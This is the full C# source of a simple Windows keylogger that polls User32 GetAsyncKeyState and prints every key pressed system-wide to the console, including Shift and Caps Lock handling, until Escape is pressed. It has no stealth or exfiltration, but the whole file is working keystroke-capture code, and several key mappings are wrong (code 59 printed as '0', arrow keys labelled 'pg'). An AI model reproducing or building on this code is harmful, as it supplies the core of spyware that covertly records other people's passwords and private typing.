using System;
using System.Runtime.InteropServices;
namespace keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int vKey);

        [DllImport("User32.dll")]
        public static extern int GetKeyState(int nVirtKey);

        static void Main(string[] args)
        {
            Console.WriteLine("Press ESC to quit");
            bool cicle = true, caps;
            while (cicle)
            {
                for (int i = 0; i < 223; i++)
                {
                    if (GetAsyncKeyState(i) == 32769)
                    {
                        if (GetKeyState(16) == 65408 || GetKeyState(16) == 65409)
                        {
                            switch (i)
                            {
                                case 48: Console.Write(") "); break;
                                case 49: Console.Write("! "); break;
                                case 50: Console.Write("@ "); break;
                                case 51: Console.Write("# "); break;
                                case 52: Console.Write("$ "); break;
                                case 53: Console.Write("% "); break;
                                case 54: Console.Write("^ "); break;
                                case 55: Console.Write("& "); break;
                                case 56: Console.Write("* "); break;
                                case 57: Console.Write("( "); break;
                                case 112: Console.Write("F1 "); break;
                                case 113: Console.Write("F2 "); break;
                                case 114: Console.Write("F3 "); break;
                                case 115: Console.Write("F4 "); break;
                                case 116: Console.Write("F5 "); break;
                                case 117: Console.Write("F6 "); break;
                                case 118: Console.Write("F7 "); break;
                                case 119: Console.Write("F8 "); break;
                                case 120: Console.Write("F9 "); break;
                                case 121: Console.Write("F10 "); break;
                                case 122: Console.Write("F11 "); break;
                                case 123: Console.Write("F12 "); break;
                                case 160:Console.Write("Left Shift  "); break;
                                case 161:Console.Write("Right Shift  "); break;
                                case 186: Console.Write(": "); break;
                                case 187: Console.Write("+ "); break;
                                case 188: Console.Write("< "); break;
                                case 189: Console.Write("_ "); break;
                                case 190: Console.Write("> "); break;
                                case 191: Console.Write("? "); break;
                                case 192: Console.Write("~ "); break;
                                case 219: Console.Write("{ "); break;
                                case 220: Console.Write("| "); break;
                                case 221: Console.Write("} "); break;
                                case 222: Console.Write("\" "); break;

                                default:
                                    if ((i >= 'A' && i <= 'Z') || (i >= 'a' && i <= 'z'))

                                    {
                                        if (GetKeyState(20) == 1)
                                        {
                                            caps = true;
                                        }
                                        else
                                        {
                                            caps = false;
                                        }

                                        if (caps)

                                        {
                                            Console.Write((char)(i + 32) + " ");
                                        }
                                        else

                                        {
                                            Console.Write((char)i + " ");
                                        }
                                    }
                                    break;
                            }
                        }
                        else 
                            switch (i)
                            {
                                case 8: Console.Write("Backspace "); break;
                                case 9: Console.Write("Tab "); break;
                                case 13: Console.Write("Enter "); break;
                                case 20: Console.Write("CapsLock "); break;
                                case 22: Console.Write("' "); break;
                                case 27: cicle = false; Console.Write("Escape "); break;
                                case 32: Console.Write("Space "); break;
                                case 37: Console.Write("pgLeft "); break;
                                case 38: Console.Write("pgUp "); break;
                                case 39: Console.Write("pgRight "); break;
                                case 40: Console.Write("pgDown "); break;
                                case 49: Console.Write("1 "); break;
                                case 50: Console.Write("2 "); break;
                                case 51: Console.Write("3 "); break;
                                case 52: Console.Write("4 "); break;
                                case 53: Console.Write("5 "); break;
                                case 54: Console.Write("6 "); break;
                                case 55: Console.Write("7 "); break;
                                case 56: Console.Write("8 "); break;
                                case 57: Console.Write("9 "); break;
                                case 59: Console.Write("0 "); break;
                                case 91: Console.Write("Win "); break;
                                case 112: Console.Write("F1 "); break;                                
                                case 113: Console.Write("F2 "); break;                                
                                case 114: Console.Write("F3 "); break;                                
                                case 115: Console.Write("F4 "); break;                                
                                case 116: Console.Write("F5 "); break;                                
                                case 117: Console.Write("F6 "); break;                                
                                case 118: Console.Write("F7 "); break;                                
                                case 119: Console.Write("F8 "); break;                                
                                case 120: Console.Write("F9 "); break;                                
                                case 121: Console.Write("F10 "); break;                                
                                case 122: Console.Write("F11 "); break;                                
                                case 123: Console.Write("F12 "); break;
                                case 162: Console.Write("leftCtrl "); break;
                                case 163: Console.Write("rightCtrl "); break;
                                case 164: Console.Write("leftAlt "); break;
                                case 165: Console.Write("rightAlt "); break;
                                case 186: Console.Write("; "); break;
                                case 187: Console.Write("= "); break;
                                case 188: Console.Write(", "); break;
                                case 189: Console.Write("- "); break;
                                case 190: Console.Write(". "); break;
                                case 191: Console.Write("/ "); break;
                                case 192: Console.Write("` "); break;
                                case 219: Console.Write("[ "); break;
                                case 220: Console.Write(@"\ "); break;
                                case 221: Console.Write("] "); break;
                                case 222: Console.Write("' "); break;

                                default:
                                    if ((i >= 'a' && i <= 'z') || (i >= 'A' && i <= 'Z'))
                                    {
                                        if (GetKeyState(20) == 1)
                                        {
                                           caps = true;
                                        }
                                        else
                                        {
                                           caps = false;
                                        }

                                        if (caps)

                                        {
                                            Console.Write((char)i + " ");
                                        }
                                        else
                                            Console.Write((char)(i + 32) + " ");
                                    }
                                    break;
                            }
                    }
                }
            }
        }   
    }
}
